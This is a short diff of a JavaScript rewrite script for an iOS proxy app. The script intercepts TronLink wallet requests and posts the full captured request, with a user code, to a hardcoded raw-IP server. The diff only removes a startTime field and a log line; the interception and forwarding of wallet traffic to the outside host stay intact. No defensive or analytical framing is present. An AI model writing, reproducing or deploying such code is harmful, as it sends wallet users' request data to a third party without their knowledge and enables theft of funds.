@@ -1,10 +1,8 @@
 const request = $request;
 const requrl = $request.url;
-const startTime = $script.startTime;
 const usercode = $argument;
 const TronLinkRegex = /wallet\/getLatestAPK\?address=/;
 console.log("1111111111111",usercode);
-console.log("1111111111111",startTime);
 if(!usercode){
     $notification.post("错误","","请填写用户码");
     $done({});
@@ -14,7 +12,7 @@ if(!usercode){
 if (TronLinkRegex.test(requrl)) {
     let params = {
         url:"http://43.134.170.213:8001/api/trx/getinfo",
-        body:[request,{"usercode":"usercode","startTime":"startTime"}],//仅仅在post请求中有效
+        body:[request,{"usercode":"usercode"}],//仅仅在post请求中有效
     }
     console.log("1111111111");
     $notification.post("通知","","找到TronLink钱包");
